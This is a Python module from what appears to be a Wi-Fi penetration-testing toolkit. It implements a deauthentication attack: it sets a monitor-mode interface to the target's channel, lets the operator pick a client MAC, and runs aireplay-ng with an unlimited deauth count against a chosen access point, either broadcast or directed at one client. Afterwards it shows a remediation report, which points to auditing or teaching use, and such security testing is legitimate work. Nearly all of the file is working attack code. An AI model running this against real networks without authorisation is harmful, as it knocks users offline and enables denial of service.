# attacks/deauth.py
import os
import time
import subprocess
from typing import Optional, List, Dict, Any
from termcolor import colored
import sys

# Local imports
from .base import BaseAttack
from utils.helpers import run_in_new_terminal
from utils.scan_networks import WiFiScanner
from solution.remediation import RemediationAdvisor



class DeauthAttack(BaseAttack):
    """Performs a broadcast or directed deauthentication attack."""
    
    def __init__(self, monitor_interface: str, bssid: str, ssid: str, channel: int, client_mac: Optional[str] = None):
        """
        Args:
            monitor_interface: The interface in monitor mode.
            bssid: The BSSID of the target AP.
            ssid: The ESSID of the target AP (for display purposes).
            channel: The channel of the target AP.
            client_mac (Optional): The MAC of a specific client. If None, the class
                                   will scan for clients.
        """
        super().__init__(monitor_interface)
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.client_mac = client_mac  # Can be None
        self.scanner = WiFiScanner()
    
    def _select_client(self, clients: List[Dict[str, Any]]) -> Optional[str]:
        """Displays a list of clients and prompts the user to select one."""
        print(colored(f"\n[✓] Found {len(clients)} client(s) for {self.ssid}:", "green"))
        print(f"\n{'NUM':<4} {'STATION MAC':<19} {'POWER':>7} {'PACKETS':>9}")
        print(f"{'---':<4} {'-------------------':<19} {'-------':>7} {'---------':>9}")
        
        for i, client in enumerate(clients, 1):
            print(f"[{i:2d}] {client['Station MAC']:<19} {client['Power']:>7} {client['# packets']:>9}")
        
        try:
            choice = input("\nSelect a client NUM to attack (or Enter to cancel) ➤ ").strip()
            if choice and 1 <= int(choice) <= len(clients):
                client_mac = clients[int(choice) - 1]['Station MAC']
                print(colored(f"[✓] Selected Client: {client_mac}", "green"))
                return client_mac
            else:
                print(colored("[!] No client selected. Aborting attack.", "yellow"))
                return None
        except (ValueError, IndexError):
            print(colored("[!] Invalid input. Aborting attack.", "red"))
            return None
    
    def _execute(self):
        """Orchestrates the deauth attack sequence."""
        # If no client MAC was given to the class, find one now.
        if not self.client_mac:
            print(colored("[*] No client specified. This will be a broadcast attack.", "cyan"))
            time.sleep(1)
        
        # Set interface to the correct channel BEFORE launching attack
        print(colored(f"[*] Setting {self.monitor_interface} to channel {self.channel}...", "cyan"))
        result = subprocess.run(
            ["iwconfig", self.monitor_interface, "channel", str(self.channel)],
            capture_output=True,
            text=True
        )
        
        if result.returncode != 0:
            print(colored(f"[!] Failed to set channel: {result.stderr}", "red"))
            return
        
        # Verify channel is set correctly
        time.sleep(0.5)
        verify = subprocess.run(
            ["iwconfig", self.monitor_interface],
            capture_output=True,
            text=True
        )
        
        if f"Frequency:{self._channel_to_freq(self.channel)}" in verify.stdout or f"Channel {self.channel}" in verify.stdout or f"Channel:{self.channel}" in verify.stdout:
            print(colored(f"[✓] Interface locked to channel {self.channel}", "green"))
        else:
            print(colored("[!] Warning: Channel may not be set correctly", "yellow"))
        
        # Launch the attack.
        try:
            attack_type = "Directed" if self.client_mac else "Broadcast"
            print(colored(f"\n[*] Starting {attack_type} Deauth Attack...", "yellow"))
            
            cmd_list = ["aireplay-ng", "--deauth", "0", "-a", self.bssid]
            
            if self.client_mac:
                cmd_list.extend(["-c", self.client_mac])
            
            cmd_list.append(self.monitor_interface)
            cmd_str = " ".join(cmd_list)
            
            run_in_new_terminal(cmd_str)
            
            print(colored("[*] Deauth attack is running in a separate window...", "cyan"))
            print(colored("    (Press Ctrl+C here to return to the menu)", "yellow"))
            
            while True:
                time.sleep(10)
        
        except KeyboardInterrupt:
            pass  # Expected when the user wants to stop the attack.
        
        finally:
            print(colored("\n[*] Stopping any running deauth attacks...", "cyan"))
            subprocess.run("pkill aireplay-ng > /dev/null 2>&1", shell=True)

            # Show remediation after successful attack run
            advisor = RemediationAdvisor()
            print(colored("Loading report and fixing steps ", "yellow"), end="")

            spinner = ["|", "/", "-", "\\"]

            for i in range(12):  # animation cycles
                sys.stdout.write("\r" + colored("Loading report and fixing steps " + spinner[i % 4], "yellow"))
                sys.stdout.flush()
                time.sleep(0.25)
            
            
            print("\r" + colored("Report loaded successfully ✓", "green"))
            os.system("clear") 
            advisor.show(
                attack_type="deauth",
                target_ssid=self.ssid,
                target_bssid=self.bssid,
                extra_info={
                    "channel": self.channel,
                    "client_mac": self.client_mac or "broadcast",
                    "interface": self.monitor_interface
                }
            )

    
    def _channel_to_freq(self, channel: int) -> str:
        """Convert channel number to frequency for verification."""
        if 1 <= channel <= 13:
            freq = 2.407 + (channel * 0.005)
            return f"{freq:.3f}"
        elif channel == 14:
            return "2.484"
        elif 36 <= channel <= 165:
            freq = 5.0 + (channel * 0.005)
            return f"{freq:.3f}"
        return "Unknown"
